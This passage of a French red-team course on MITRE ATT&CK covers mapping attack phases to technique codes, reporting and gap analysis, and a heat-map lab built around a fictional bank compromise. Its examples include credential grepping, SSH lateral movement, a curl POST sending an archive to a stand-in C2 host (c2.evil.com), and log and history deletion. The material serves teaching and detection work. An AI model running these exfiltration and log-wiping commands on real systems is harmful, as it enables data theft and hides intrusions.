| `grep -E "DB_PASSWORD\|DB_USER"` | Filtre les lignes contenant les chaînes `DB_PASSWORD` ou `DB_USER` ; `-E` = regex étendue ; `\|` = opérateur OU dans la regex |
| `for i in $(seq 1 254); do ... done` | Boucle shell qui itère de 1 à 254 (généré par `seq`) pour scanner un sous-réseau |
| `ping -c 1 10.0.0.$i` | Envoie un paquet ICMP Echo Request à chaque IP du réseau ; `-c 1` = un seul paquet |
| `grep "bytes from"` | Filtre la sortie de ping : si une machine répond, la ligne contient "bytes from" |
| `&` | Exécute chaque commande ping en arrière-plan pour paralléliser le scan (beaucoup plus rapide qu'une exécution séquentielle) |

| Technique | Code | Description |
|---|---|---|
| Unsecured Credentials | **T1552** | Credentials en clair dans les fichiers |
| Network Service Discovery | **T1046** | Scan du réseau interne |

#### Phase 7 : Lateral Movement (TA0008) + Collection (TA0009)

```bash
# Connexion SSH vers le serveur cible avec les identifiants volés (mouvement latéral)
# ssh : Secure Shell — protocole de connexion distante chiffrée
# admin@10.0.0.25 : utilisateur "admin" sur la machine 10.0.0.25 (serveur de base de données)
# La connexion interactive permet d'exécuter des commandes sur la machine distante
ssh admin@10.0.0.25

# Compression des fichiers sensibles en vue d'une exfiltration
# tar : Tape ARchive — outil d'archivage de fichiers
# czf : flags combinés (voir tableau ci-dessous)
# data.tar.gz : nom du fichier d'archive compressée en sortie
# /var/backups/sql/ : répertoire source contenant les dumps de base de données à archiver
tar czf data.tar.gz /var/backups/sql/
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `ssh admin@10.0.0.25` | Connexion SSH à la machine distante 10.0.0.25 avec l'utilisateur `admin` ; `ssh` = chiffre le trafic entre les deux machines |
| `tar czf data.tar.gz /var/backups/sql/` | Crée une archive compressée ; voir détails des flags ci-dessous |

**Explication des flags tar :**

| Flag | Rôle |
|---|---|
| `c` | Create — crée une nouvelle archive (mode création) |
| `z` | GZip — compresse l'archive avec l'algorithme gzip (produit un `.tar.gz`) |
| `f` | File — spécifie le nom du fichier d'archive en sortie (`data.tar.gz`) |
| `data.tar.gz` | Nom du fichier d'archive produit (contient les données compressées) |
| `/var/backups/sql/` | Répertoire source dont le contenu est archivé récursivement |

| Technique | Code | Description |
|---|---|---|
| Remote Services | **T1021** | SSH pour mouvement latéral |
| Archive Collected Data | **T1560** | Compression des données volées |

#### Phase 8 : Command and Control (TA0011)

```bash
# Communication C2 via DNS tunneling (exfiltration cachée dans les requêtes DNS)
# nslookup : outil de résolution DNS (interroge les serveurs DNS)
# -type=TXT : interroge les enregistrements TXT d'un domaine
#   Les enregistrements TXT peuvent contenir des données arbitraires
#   Le serveur C2 encode ses instructions dans la réponse DNS TXT
# Cette technique contourne les pare-feux car le DNS est rarement filtré
nslookup -type=TXT exfil.c2-domain.com

# Exfiltration des données via HTTP POST vers le serveur C2
# curl -X POST : requête HTTP POST (envoi de données dans le corps)
# -d @data.tar.gz : envoie le contenu du fichier local data.tar.gz dans le corps de la requête
#   @ = préfixe indiquant un fichier plutôt qu'une chaîne littérale
# L'URL https://c2.evil.com/exfil est le point de réception côté attaquant
# Le trafic HTTPS est chiffré et se mélange au trafic web légitime
curl -X POST -d @data.tar.gz https://c2.evil.com/exfil
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `nslookup -type=TXT exfil.c2-domain.com` | Interroge le DNS pour les enregistrements TXT du domaine ; `-type=TXT` = filtre sur le type d'enregistrement ; les enregistrements TXT peuvent contenir des instructions encodées par le C2 |
| `curl -X POST -d @data.tar.gz https://c2.evil.com/exfil` | Envoie les données volées au serveur C2 via HTTP POST ; `-X POST` = méthode POST ; `-d @data.tar.gz` = envoie le fichier `data.tar.gz` dans le corps de la requête ; HTTPS chiffre le transfert |

**Explication des flags curl :**

| Flag | Rôle |
|---|---|
| `-X POST` | Spécifie la méthode HTTP POST (envoi de données dans le corps de la requête) |
| `-d @data.tar.gz` | Définit les données à envoyer ; `@` = le contenu est lu depuis un fichier ; utile pour exfiltrer des fichiers volumineux |

| Technique | Code | Description |
|---|---|---|
| Application Layer Protocol | **T1071** | C2 via HTTPS (ressemble à du trafic légitime) |
| Protocol Tunneling | **T1572** | DNS tunneling pour contourner les filtres |

### 6.2 Tableau des techniques ATT&CK clés en pentest web

| Technique | Code | Sous-technique | Usage en pentest web |
|---|---|---|---|
| Exploit Public-Facing Application | **T1190** | — | Faille dans l'applicatif web (SQLi, XSS, RCE, LFI) |
| Valid Accounts | **T1078** | .003 (Local Accounts) | Utilisation de comptes par défaut ou volés |
| Phishing | **T1566** | .002 (Spearphishing Link) | Lien malveillant envoyé aux employés |
| Drive-by Compromise | **T1189** | — | Compromission via navigateur (watering hole) |
| External Remote Services | **T1133** | — | VPN, RDP, Citrix exposés |
| Command and Scripting Interpreter | **T1059** | .004 (Unix Shell), .007 (JavaScript) | Exécution de commandes via webshell, SSRF |
| User Execution | **T1204** | .002 (Malicious File) | Victime ouvre un fichier malveillant |
| Server Software Component | **T1505** | .003 (Web Shell) | Webshell déposé sur le serveur |
| OS Credential Dumping | **T1003** | .001 (LSASS Memory), .003 (NTDS) | Vol de hashs Windows |
| Unsecured Credentials | **T1552** | .001 (Credentials In Files) | Mots de passe en clair dans configs |
| Archive Collected Data | **T1560** | .001 (Archive via Utility) | Compression des données exfiltrées |
| Exfiltration Over Web Service | **T1567** | .002 (Exfiltration to Cloud Storage) | Envoi des données vers un service cloud |
| Data Encrypted for Impact | **T1486** | — | Chiffrement ransomware |
| Indicator Removal on Host | **T1070** | .003 (Clear Command History) | Nettoyage des logs après action |

---

## 7. ATT&CK comme outil de reporting

### 7.1 Matrice de couverture

En fin de mission, le Red Team présente une **matrice de couverture** qui répond à trois questions :

1. **Qu'avons-nous testé ?** (techniques utilisées pendant l'engagement)
2. **Qu'avons-nous détecté ?** (techniques détectées par la défense)
3. **Qu'avons-nous réussi à exploiter ?** (techniques ayant abouti)

**Exemple de tableau de couverture :**

| Tactique | Technique | Testé | Détecté | Exploité | Commentaire |
|---|---|---|---|---|---|
| Initial Access | T1190 (Exploit Public-Facing App) | ✅ | ❌ | ✅ | SQLi non détectée par le WAF |
| Execution | T1059 (Command & Scripting Interpreter) | ✅ | ✅ | ✅ | Webshell détecté après 2h |
| Persistence | T1505.003 (Web Shell) | ✅ | ❌ | ✅ | Webshell toujours actif en fin de test |
| Credential Access | T1003 (OS Credential Dumping) | ✅ | ✅ | ❌ | Détecté par EDR – pas de dump réussi |
| Impact | T1486 (Data Encrypted for Impact) | ❌ | N/A | N/A | Hors scope |

### 7.2 Gap analysis

La **gap analysis** compare l'état actuel de la défense (baseline) avec l'état souhaité (target).

```bash
# Sauvegarder le script de comparaison :
cat > compare_layers.py << 'PYEOF'
```

```python
#!/usr/bin/env python3
"""
compare_layers.py — Compare deux couches ATT&CK Navigator

Usage :
    python3 compare_layers.py current.json target.json

Ce script identifie les techniques présentes dans la couche cible
mais absentes ou faiblement scorées dans la couche actuelle.
"""

import json      # Module pour lire/écrire du JSON (format des couches Navigator)
import sys       # Module pour accéder aux arguments de la ligne de commande (argv)

def load_layer(filepath):
    """
    Charge une couche ATT&CK depuis un fichier JSON.
    Retourne un dictionnaire {techniqueID: {score, comment}}.
    - filepath : chemin vers le fichier JSON de la couche
    """
    # Ouverture et lecture du fichier JSON
    with open(filepath, 'r') as f:
        data = json.load(f)              # Parse le JSON en dictionnaire Python

    techniques = {}
    # Parcours de la liste des techniques dans le fichier de couche
    for t in data.get('techniques', []):
        # Extraction de l'ID technique (ex: "T1190") et sous-technique si existante
        tech_id = t['techniqueID']
        techniques[tech_id] = {
            'score': t.get('score', 0),          # Score de couverture (0-100), défaut 0
            'comment': t.get('comment', '')       # Commentaire associé, défaut chaîne vide
        }
    return techniques

def main():
    # Vérification du nombre d'arguments
    # sys.argv[0] = nom du script, sys.argv[1] = current.json, sys.argv[2] = target.json
    if len(sys.argv) != 3:
        print("Usage: python3 compare_layers.py current.json target.json")
        sys.exit(1)                              # Quitte le script avec code d'erreur 1

    # Chargement des deux couches
    current = load_layer(sys.argv[1])             # Couche "état actuel" de la détection
    target = load_layer(sys.argv[2])              # Couche "état cible" souhaité

    # Affichage de l'en-tête du rapport
    print("=" * 80)                               # Ligne de séparation (80 tirets)
    print("GAP ANALYSIS — Techniques cibles non couvertes ou sous-couvertes")
    print("=" * 80)

    gap_found = False                             # Flag : au moins un gap détecté ?
    # Pour chaque technique dans la couche cible
    for tech_id, tech_data in target.items():
        # Récupération du score actuel (0 si technique absente)
        current_score = current.get(tech_id, {}).get('score', 0)
        target_score = tech_data['score']          # Score souhaité

        # Si le score actuel est inférieur au score cible → gap
        if current_score < target_score:
            gap_found = True
            gap = target_score - current_score     # Écart en points
            # Statut : "ABSENTE" si score = 0, sinon "SOUS-COUVERTE"
            status = "ABSENTE" if current_score == 0 else f"SOUS-COUVERTE (gap: {gap} pts)"

            # Affichage détaillé du gap
            print(f"\n{tech_id} — {status}")
            print(f"  Score actuel : {current_score}/100")
            print(f"  Score cible   : {target_score}/100")
            print(f"  Commentaire cible : {tech_data['comment']}")

    # Si aucun gap n'a été trouvé
    if not gap_found:
        print("\n✅ Toutes les techniques cibles sont couvertes.")

# Point d'entrée du script : exécuté seulement si le fichier est lancé directement
if __name__ == "__main__":
    main()
```

PYEOF
chmod +x compare_layers.py

```bash
# Exécution du script de gap analysis avec deux fichiers JSON
# python3 : interpréteur Python 3
# compare_layers.py : script à exécuter
# detection_current.json : couche représentant l'état actuel de la détection
# nis2_target.json : couche cible correspondant aux exigences NIS2
# Le script compare les deux et affiche les techniques non couvertes ou sous-couvertes
python3 compare_layers.py detection_current.json nis2_target.json
```

**Explication du script Python :**

| Élément | Rôle / Explication |
|---|---|
| `load_layer(filepath)` | Fonction qui ouvre un fichier JSON et extrait les techniques avec leur score et commentaire dans un dictionnaire |
| `json.load(f)` | Parse le contenu du fichier JSON en structures Python (dictionnaires, listes) |
| `data.get('techniques', [])` | Récupère la liste des techniques ; retourne une liste vide si la clé est absente |
| `len(sys.argv) != 3` | Vérifie que l'utilisateur a bien fourni exactement 2 arguments (fichiers current et target) |
| `current.get(tech_id, {}).get('score', 0)` | Récupère le score d'une technique dans la couche actuelle ; retourne 0 si la technique est absente |
| `if __name__ == "__main__"` | Condition d'exécution : le code sous ce bloc ne s'exécute que si ce fichier est lancé directement (pas importé comme module) |

**Explication de la commande d'exécution :**

| Argument | Rôle |
|---|---|
| `python3` | Interpréteur Python version 3 (obligatoire pour exécuter un script `.py`) |
| `compare_layers.py` | Le script Python qui réalise l'analyse comparative |
| `detection_current.json` | Fichier JSON de la couche actuelle (état réel de la détection) |
| `nis2_target.json` | Fichier JSON de la couche cible (objectif à atteindre selon NIS2) |

**Sortie typique :**

```
================================================================================
GAP ANALYSIS — Techniques cibles non couvertes ou sous-couvertes
================================================================================

T1190 — ABSENTE
  Score actuel : 0/100
  Score cible   : 80/100
  Commentaire cible : Détection des exploits applicatifs (WAF + RASP)

T1505.003 — SOUS-COUVERTE (gap: 55 pts)
  Score actuel : 25/100
  Score cible   : 80/100
  Commentaire cible : Détection des webshells par analyse de comportement
```

### 7.3 Rapport exécutif vs rapport technique

| Élément | Rapport Exécutif (Dirigeant) | Rapport Technique (Ops) |
|---|---|---|
| Public | DSI, COMEX, RSSI | Analystes SOC, ingénieurs sécurité |
| Niveau de détail | Synthétique | Très détaillé |
| Utilisation ATT&CK | Heat map globale par tactique | Liste exhaustive des TTPs |
| Métriques | % de couverture, score global | Gap analysis par technique |
| Livrables | PDF + Heat map PNG | JSON Navigator + règles Sigma |
| Durée de lecture | 2-3 pages | 30-50 pages |

**Structure d'un rapport exécutif avec ATT&CK :**

```
1. Résumé exécutif
   - Objectif de l'engagement
   - Périmètre testé
   - Score de sécurité global (ex : 62/100)

2. Synthèse visuelle
   - Heat map ATT&CK Navigator (niveau tactique)
   - Top 5 des techniques les plus critiques non couvertes

3. Recommandations prioritaires
   - Par ordre d'impact sur la couverture ATT&CK
   - Budget estimé

4. Annexes
   - Heat map détaillée (niveau technique)
   - Fichier JSON de la couche
   - Calendrier de remediation
```

**Structure d'un rapport technique avec ATT&CK :**

```
1. Périmètre et méthodologie
   - Matrice ATT&CK utilisée (Enterprise v14)
   - Liste des techniques testées avec codes TXXXX

2. Chronologie de l'attaque
   - Timeline avec les tactiques ATT&CK atteintes
   - Pour chaque étape : technique, procédure, résultat

3. Détail des techniques exploitées
   - T1190 : Exploitation SQLi (CVSS 9.8)
   - T1505.003 : Webshell JSP déposé
   - T1021.004 : Mouvement latéral SSH

4. Détection et remédiation
   - Par technique : règles de détection proposées (Sigma, Splunk, KQL)
   - Configuration de durcissement

5. Fichier de couche ATT&CK
   - JSON Navigator complet
   - Instructions d'import
```

---

## 8. TP Pratique : Créer une heat map ATT&CK

### 8.1 Objectif

À partir d'un **scénario de compromission** (un pentest web sur une application bancaire fictive), vous allez :

1. Analyser le scénario et identifier les TTPs utilisées
2. Installer et lancer ATT&CK Navigator
3. Créer une heat map annotée
4. Exporter la couche au format JSON
5. Interpréter les résultats

### 8.2 Scénario de compromission : "Opération CaisseNoire"

**Contexte :** Vous êtes Red Team sur l'application **BanX** (banque en ligne). Votre mission est de tester la détection de l'équipe SOC. Voici le déroulé de votre attaque :

```
Phase 1 — Reconnaissance (Jour 1)
    → Scan Shodan pour trouver les IPs exposées de BanX
    → Découverte de : 185.23.45.67 (portail web), 185.23.45.78 (API)

Phase 2 — Initial Access (Jour 2)
    → SQL Injection sur l'endpoint /api/v1/transfer?account_id=1 UNION SELECT...
    → Extraction de 12 000 comptes utilisateurs (hashs bcrypt + emails)

Phase 3 — Exécution (Jour 2)
    → Upload d'un webshell PHP via une faille de téléchargement sur /uploads/profile.php
    → Commande exécutée : whoami → www-data

Phase 4 — Persistence + Privilege Escalation (Jour 3)
    → Webshell conservé dans /var/www/html/uploads/shell.php
    → Exploitation CVE-2024-XXXX sur le kernel → passage root

Phase 5 — Credential Access (Jour 3)
    → Dump de /etc/shadow (11 comptes root, oracle, admin, backup)
    → Crack de 3 mots de passe : admin / Pa\$\$w0rd! / backup / B@ckup2024!

Phase 6 — Movement (Jour 4)
    → Connexion SSH vers le serveur de base de données (10.0.1.50) avec les credentials root
    → Dump de la base de données : mysqldump --all-databases > dump.sql

Phase 7 — Exfiltration (Jour 4)
    → Compression du dump : tar czf dump.tar.gz dump.sql (taille : 2.3 Go)
    → Transfert via scp vers un serveur Cloud external (serveur vps hébergé)

Phase 8 — Nettoyage (Jour 4)
    → Suppression des logs : rm -rf /var/log/apache2/access.log
    → Suppression de l'historique bash : history -c
```

### 8.3 Travail à réaliser

**Étape 1 : Identifier les TTPs** (15 min)

Pour chaque phase du scénario, identifiez les codes ATT&CK correspondants.

Utilisez le site [https://attack.mitre.org](https://attack.mitre.org) ou le fichier de cours ci-dessus.

**Correction :**

| Phase | Action | Technique | Code | Sous-technique |
|---|---|---|---|---|
| 1 | Scan Shodan | Search Open Technical Databases | **T1596** | .001 (DNS/Passive DNS) |
| 2 | SQL Injection | Exploit Public-Facing Application | **T1190** | — |
| 3 | Webshell upload | Server Software Component | **T1505** | .003 (Web Shell) |
| 3 | whoami | Command and Scripting Interpreter | **T1059** | .004 (Unix Shell) |
| 4 | Webshell conservé | Server Software Component | **T1505** | .003 (Web Shell) |
| 4 | Exploit kernel | Exploitation for Privilege Escalation | **T1068** | — |
| 5 | Dump /etc/shadow | OS Credential Dumping | **T1003** | — |
| 5 | Crack mots de passe | Brute Force | **T1110** | .002 (Password Cracking) |
| 6 | SSH vers DB | Remote Services | **T1021** | .004 (SSH) |
| 6 | mysqldump | Data from Information Repositories | **T1213** | — |
| 7 | Compression | Archive Collected Data | **T1560** | .001 (Archive via Utility) |
| 7 | Transfert SCP | Exfiltration Over Alternative Protocol | **T1048** | .002 (Exfiltration Over Asymmetric Encrypted Non-C2 Protocol) |
| 8 | Suppression logs | Indicator Removal on Host | **T1070** | .003 (Clear Command History) |

**Étape 2 : Installer ATT&CK Navigator** (15 min)

Suivez les instructions de la section 5 avec Docker.

```bash
# Vérifier que Docker est bien installé sur le système
# docker --version : affiche la version installée de Docker
# Si la commande échoue, Docker n'est pas installé → revenir à la section 5.2
docker --version

# Cloner le dépôt officiel de l'ATT&CK Navigator depuis GitHub
git clone https://github.com/mitre-attack/attack-navigator.git

# Se placer dans le répertoire du projet cloné
cd attack-navigator

# Construire l'image Docker à partir du Dockerfile
# -t attack-navigator : nomme l'image pour la référencer facilement
docker build -t attack-navigator .

# Lancer le conteneur en arrière-plan
# -d : mode détaché (arrière-plan)
# -p 4200:4200 : mappage de ports (hôte:conteneur)
# --name attack-navigator : nom du conteneur
docker run -d -p 4200:4200 --name attack-navigator attack-navigator

# Vérifier que le conteneur est bien en cours d'exécution
# docker ps : liste les conteneurs actifs
# grep attack-navigator : filtre pour n'afficher que notre conteneur
docker ps | grep attack-navigator

# Accéder à l'interface web depuis le navigateur
# http://localhost:4200
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `docker --version` | Vérifie la présence de Docker et affiche le numéro de version installé |
| `git clone ...` | Télécharge le code source du dépôt GitHub mitre-attack/attack-navigator |
| `cd attack-navigator` | Se place dans le dossier du projet pour exécuter les commandes Docker |
| `docker build -t attack-navigator .` | Construit l'image Docker ; `-t` = tag (nom de l'image) ; `.` = répertoire courant comme contexte |
| `docker run -d -p 4200:4200 --name attack-navigator attack-navigator` | Lance le conteneur ; `-d` = arrière-plan ; `-p` = port mapping ; `--name` = nom du conteneur |
| `docker ps | grep attack-navigator` | Liste les conteneurs actifs et filtre pour vérifier que le nôtre tourne |
| `http://localhost:4200` | URL d'accès à l'interface web sur la machine locale |

**Étape 3 : Créer la heat map** (20 min)

1. Ouvrir [http://localhost:4200](http://localhost:4200)
2. Cliquer sur **"Create Layer"** → **"Enterprise"**
3. Nommer la couche : `Opération CaisseNoire - Red Team BanX`
4. Ajouter les techniques identifiées :

| Technique | Score | Commentaire |
|---|---|---|
| T1596.001 | 90 | Scan Shodan — OSINT passif |
| T1190 | 100 | SQL Injection critique — accès initial |
| T1505.003 | 95 | Webshell PHP uploadé |
| T1059.004 | 70 | Exécution de commandes shell |
| T1068 | 85 | Exploit kernel CVE-2024-XXXX |
| T1003 | 90 | Dump /etc/shadow |
| T1110.002 | 75 | Crack de mots de passe |
| T1021.004 | 80 | SSH lateral movement |
| T1213 | 80 | Dump base de données via mysqldump |
| T1560.001 | 70 | Compression des données exfiltrées |
| T1048.002 | 95 | Exfiltration SCP vers serveur externe |
| T1070.003 | 85 | Suppression des logs |

5. Pour chaque technique, cliquer droit → **"Assign Score"** → entrer le score
6. Optionnel : ajouter des commentaires dans **"Assign Comment"**

**Étape 4 : Exporter la couche** (5 min)

```bash
# Dans l'interface Navigator : export de la couche au format JSON
# 1. Cliquer sur l'icône de téléchargement (⬇) dans la barre d'outils supérieure
# 2. Choisir "Download as JSON" pour générer le fichier de couche portable
# 3. Enregistrer le fichier sous le nom : CaisseNoire_heatmap.json
# Le fichier JSON contient toutes les techniques, scores, couleurs et commentaires
```

**Explication :**

| Action | Description |
|---|---|
| Icône de téléchargement (⬇) | Bouton dans la barre d'outils de Navigator qui ouvre le menu d'export |
| "Download as JSON" | Option de téléchargement qui génère un fichier JSON contenant toutes les annotations de la couche |
| `CaisseNoire_heatmap.json` | Nom du fichier de sortie contenant la heat map exportée pour l'opération CaisseNoire |

**Étape 5 : Interpréter les résultats** (10 min)

Analysez la heat map obtenue :

- **Quelles tactiques sont les plus couvertes ?** → Initial Access, Execution, Persistence
- **Quelles tactiques sont absentes ?** → Resource Development, Collection (partiellement), Defense Evasion (partiellement)
- **Quelle est la technique la plus critique ?** → T1190 (SQL Injection — accès initial)

**Question réflexion :** Si vous étiez le SOC de BanX, quelles sont les 3 techniques sur lesquelles concentrer vos efforts de détection en priorité ?

**Éléments de réponse :**

1. **T1190 (Exploit Public-Facing Application)** : C'est la porte d'entrée. Sans détection ici, l'attaquant a tout le temps nécessaire.
2. **T1505.003 (Web Shell)** : Un webshell est un marqueur fort de compromission. La détection doit être rapide.
3. **T1048.002 (Exfiltration Over Alternative Protocol)** : C'est le moment où les données quittent le réseau. C'est la dernière ligne de défense.

### 8.4 Rendu attendu

```text
📁 TP_MITRE_ATTACK/
├── CaisseNoire_heatmap.json     # Fichier de couche ATT&CK Navigator exporté
├── README_analyse.md            # Analyse de la heat map (5-10 lignes)
└── screenshot_heatmap.png       # Capture d'écran de la heat map (optionnel)
```

### 8.5 Exemple de fichier JSON de correction

Voici le fichier de couche correspondant à la correction de l'exercice :

```json
{
    "name": "Opération CaisseNoire - Red Team BanX",
    "version": "4.1",
    "domain": "mitre-enterprise",
    "description": "Heat map de l'engagement Red Team sur BanX — Mai 2026",
    "techniques": [
        {
            "techniqueID": "T1596",
            "sub-techniques": [
                {
                    "techniqueID": "T1596.001",
                    "color": "#1ba81b",
                    "score": 90,
                    "comment": "Scan Shodan — OSINT passif"
                }
            ],
            "color": "#1ba81b",
            "score": 90,
            "comment": "Scan Shodan"
        },
        {
            "techniqueID": "T1190",
            "color": "#d62728",
            "score": 100,
            "comment": "SQL Injection critique — accès initial réussi"
        },
        {
            "techniqueID": "T1505",
            "sub-techniques": [
                {
                    "techniqueID": "T1505.003",
                    "color": "#d62728",
                    "score": 95,
                    "comment": "Webshell PHP uploadé et persistant"
                }
            ],
            "color": "#d62728",
            "score": 95,
            "comment": "Webshell PHP"
        },
        {
            "techniqueID": "T1059",
            "sub-techniques": [
                {
                    "techniqueID": "T1059.004",
                    "color": "#f5b042",
                    "score": 70,
                    "comment": "Exécution de commandes shell via webshell"
                }
            ],
            "color": "#f5b042",
            "score": 70,
            "comment": "Exécution de commandes"
        },
        {
            "techniqueID": "T1068",
            "color": "#f5b042",
            "score": 85,
            "comment": "Exploit kernel CVE-2024-XXXX — élévation root"
        },
        {
            "techniqueID": "T1003",
            "color": "#d62728",
            "score": 90,
            "comment": "Dump /etc/shadow — 11 comptes extraits"
        },
        {
            "techniqueID": "T1110",
            "sub-techniques": [
                {
                    "techniqueID": "T1110.002",
                    "color": "#f5b042",
                    "score": 75,
                    "comment": "Crack de mots de passe — 3 comptes compromis"
                }
            ],
            "color": "#f5b042",
            "score": 75,
            "comment": "Password cracking"
        },
        {
            "techniqueID": "T1021",
            "sub-techniques": [
                {
                    "techniqueID": "T1021.004",
                    "color": "#f5b042",
                    "score": 80,
                    "comment": "SSH vers base de données (10.0.1.50)"
                }
            ],
            "color": "#f5b042",
            "score": 80,
            "comment": "SSH lateral movement"
        },
        {
            "techniqueID": "T1213",
            "color": "#f5b042",
            "score": 80,
            "comment": "mysqldump de toutes les bases"
        },
        {
            "techniqueID": "T1560",
            "sub-techniques": [
                {
                    "techniqueID": "T1560.001",
                    "color": "#98df8a",
                    "score": 70,
                    "comment": "Compression tar.gz (2.3 Go)"
                }
            ],
            "color": "#98df8a",
            "score": 70,
            "comment": "Archive collected data"
        },
        {
            "techniqueID": "T1048",
            "sub-techniques": [
                {
                    "techniqueID": "T1048.002",
                    "color": "#d62728",
                    "score": 95,
                    "comment": "Exfiltration SCP vers serveur VPS externe"
                }
            ],
            "color": "#d62728",
            "score": 95,
            "comment": "Exfiltration SCP"
        },
        {
            "techniqueID": "T1070",
            "sub-techniques": [
                {
                    "techniqueID": "T1070.003",
                    "color": "#f5b042",
                    "score": 85,
                    "comment": "Suppression logs Apache + historique bash"
                }
            ],
            "color": "#f5b042",
            "score": 85,
            "comment": "Suppression des logs"
        }
    ],
    "gradient": {
        "colors": [
            "#98df8a",
            "#f5b042",
            "#d62728"
        ],
        "minValue": 0,
        "maxValue": 100
    },
    "legendItems": [
        {
            "label": "Non testé / Non couvert",
            "color": "#ececec"
        },
        {
            "label": "Testé — non détecté",
            "color": "#f5b042"
        },
        {
            "label": "Testé et détecté",
            "color": "#98df8a"
        },
        {
            "label": "Testé et réussi (critique)",
            "color": "#d62728"
        }
    ],
    "filters": {
        "stages": ["act"],
        "platforms": ["linux"]
    },
    "sorting": 0,
    "viewMode": 0,
    "hideDisabled": true
}
```

### 8.6 Pour aller plus loin

- **Comparer deux couches :** importez la couche de correction ci-dessus et une couche "détection idéale" pour visualiser les gaps
- **Ajouter des métadonnées :** associez des tags CVSS, des identifiants CVE, ou des références internes
- **Automatiser la génération :** écrivez un script Python qui parse les logs d'un engagement Red Team et génère automatiquement le fichier JSON de couche ATT&CK

---

## Annexe A : Ressources

| Ressource | URL |
|---|---|
| MITRE ATT&CK (site officiel) | [https://attack.mitre.org](https://attack.mitre.org) |
| ATT&CK Navigator | [https://github.com/mitre-attack/attack-navigator](https://github.com/mitre-attack/attack-navigator) |
| Documentation STIX 2.1 | [https://oasis-open.github.io/cti-documentation/](https://oasis-open.github.io/cti-documentation/) |
| ANSSI — Guide d'hygiène | [https://www.ssi.gouv.fr/guide/guide-dhygiene-informatique/](https://www.ssi.gouv.fr/guide/guide-dhygiene-informatique/) |
| ANSSI — PASSI | [https://cyber.gouv.fr/](https://cyber.gouv.fr/) |
| Directive NIS2 (EUR-Lex) | [https://eur-lex.europa.eu/eli/dir/2022/2555](https://eur-lex.europa.eu/eli/dir/2022/2555) |
| MITRE ATT&CK pour Red Team | [https://attack.mitre.org/resources/getting-started/](https://attack.mitre.org/resources/getting-started/) |
| Sigma Rules (détection) | [https://github.com/SigmaHQ/sigma](https://github.com/SigmaHQ/sigma) |
| Atomic Red Team (tests) | [https://github.com/redcanaryco/atomic-red-team](https://github.com/redcanaryco/atomic-red-team) |

## Annexe B : Commandes essentielles

```bash
# ====================================================================
# ATT&CK NAVIGATOR — Commandes de gestion du conteneur Docker
# ====================================================================

# Cloner le dépôt officiel de l'ATT&CK Navigator
git clone https://github.com/mitre-attack/attack-navigator.git

# Se placer dans le répertoire du projet
cd attack-navigator

# Construire l'image Docker (voir section 5.2 pour le détail des flags)
docker build -t attack-navigator .

# Lancer le conteneur en arrière-plan avec mappage de port
docker run -d -p 4200:4200 --name attack-navigator attack-navigator

# Arrêter le conteneur proprement (envoie SIGTERM au processus principal)
docker stop attack-navigator

# Redémarrer un conteneur existant (après un arrêt)
docker start attack-navigator

# Supprimer définitivement le conteneur (nécessite un arrêt préalable)
docker rm attack-navigator

# ====================================================================
# RECHERCHE DANS LA MATRICE ATT&CK VIA L'API STIX
# ====================================================================
```

> **Prérequis — Installation de jq :**
> ```bash
> # Installation de jq : outil en ligne de commande pour traiter et filtrer du JSON
> # jq permet d'extraire des champs spécifiques depuis la réponse JSON de l'API STIX
> # -y : répond "oui" automatiquement à la confirmation d'installation
> sudo apt install -y jq
> ```
>
> **Explication :**
>
> | Commande | Rôle |
> |---|---|
> | `sudo apt install -y jq` | Installe `jq`, un processeur JSON en ligne de commande, utilisé pour filtrer les réponses de l'API ATT&CK |

```bash
# Liste de toutes les techniques de la matrice Enterprise via l'API STIX
# curl -s : requête HTTP silencieuse (sans barre de progression)
# L'URL pointe vers le flux STIX officiel de MITRE au format JSON
# | (pipe) : redirige la sortie de curl vers jq
# jq '.objects[] | select(.type=="attack-pattern") | {"id": ..., "name": ...}'
#   .objects[] : parcourt chaque élément du tableau "objects"
#   select(.type=="attack-pattern") : filtre pour ne garder que les techniques (type attack-pattern)
#   {"id": .external_references[0].external_id, "name": .name} : extrait l'ID ATT&CK (ex: T1190) et le nom
curl -s https://raw.githubusercontent.com/mitre-attack/attack-stix-data/master/enterprise-attack/enterprise-attack.json \
    | jq '.objects[] | select(.type=="attack-pattern") | {"id": .external_references[0].external_id, "name": .name}'

# Recherche d'une technique spécifique par son identifiant ATT&CK
# Même flux STIX, mais on filtre sur l'external_id == "T1190" (Exploit Public-Facing Application)
# On extrait cette fois le nom et la description complète de la technique
curl -s https://raw.githubusercontent.com/mitre-attack/attack-stix-data/master/enterprise-attack/enterprise-attack.json \
    | jq '.objects[] | select(.external_references[0].external_id == "T1190") | {name, description}'

# ====================================================================
# ATOMIC RED TEAM — Exécution de tests de détection
# ====================================================================

# Installation du framework Atomic Red Team (tests de détection automatisés)
# git clone : télécharge le dépôt contenant tous les tests organisés par technique ATT&CK
git clone https://github.com/redcanaryco/atomic-red-team.git

# Se placer dans le répertoire du projet
cd atomic-red-team

# Installation des dépendances Python (nécessaires pour certains tests)
# pip : gestionnaire de paquets Python
# -r requirements.txt : installe toutes les librairies listées dans le fichier requirements
pip install -r requirements.txt

# Exécution d'un test spécifique — Affichage des détails
# Invoke-AtomicTest : commande PowerShell du framework Atomic Red Team
# T1190 : identifiant ATT&CK de la technique à tester (Exploit Public-Facing Application)
# -ShowDetails : affiche les détails du test sans l'exécuter (mode dry-run)
Invoke-AtomicTest T1190 -ShowDetails

# Exécution réelle du test
# -Execute : lance effectivement le test sur la machine (attention : peut modifier le système)
# En environment de test, cela permet de valider que les règles de détection fonctionnent
Invoke-AtomicTest T1190 -Execute
```

**Explication des commandes Docker (Navigator) :**

| Commande | Rôle |
|---|---|
| `docker build -t attack-navigator .` | Construit l'image Docker à partir du Dockerfile |
| `docker run -d -p 4200:4200 --name attack-navigator attack-navigator` | Lance le conteneur en arrière-plan |
| `docker stop attack-navigator` | Arrête proprement le conteneur (SIGTERM) |
| `docker start attack-navigator` | Redémarre un conteneur arrêté |
| `docker rm attack-navigator` | Supprime le conteneur (définitif) |

**Explication des commandes de recherche (curl + jq) :**

| Commande / Option | Rôle / Explication |
|---|---|
| `curl -s <URL>` | Télécharge le fichier JSON du flux STIX ; `-s` = mode silencieux (sans progression) |
| `jq '.objects[] \| select(.type=="attack-pattern") \| {"id": ..., "name": ...}'` | Filtre le JSON : parcourt tous les objets, ne garde que les `attack-pattern` (techniques), extrait l'ID ATT&CK et le nom |
